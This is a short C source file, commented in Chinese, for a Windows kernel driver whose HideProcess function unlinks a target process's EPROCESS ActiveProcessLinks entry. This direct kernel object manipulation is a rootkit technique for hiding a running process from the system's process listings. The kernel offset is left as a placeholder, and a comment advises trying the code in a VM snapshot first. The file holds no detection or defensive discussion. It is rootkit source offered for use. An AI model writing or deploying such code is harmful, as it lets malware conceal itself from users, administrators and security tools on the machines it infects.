// 摘 ActiveProcessLinks 的最小骨架 —— WDM 驱动，先在快照里验证
#include <ntifs.h>

NTSTATUS HideProcess(ULONG targetPid) {
    PEPROCESS target = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId(ULongToHandle(targetPid), &target)))
        return STATUS_NOT_FOUND;

    // EPROCESS->ActiveProcessLinks 偏移随版本变，用 [EPROCESS_ActiveProcessLinks偏移] 占位
    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)target + [EPROCESS_ActiveProcessLinks偏移]);
    PLIST_ENTRY prev = links->Blink;
    PLIST_ENTRY next = links->Flink;
    prev->Flink = next;      // 摘链
    next->Blink = prev;

    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}
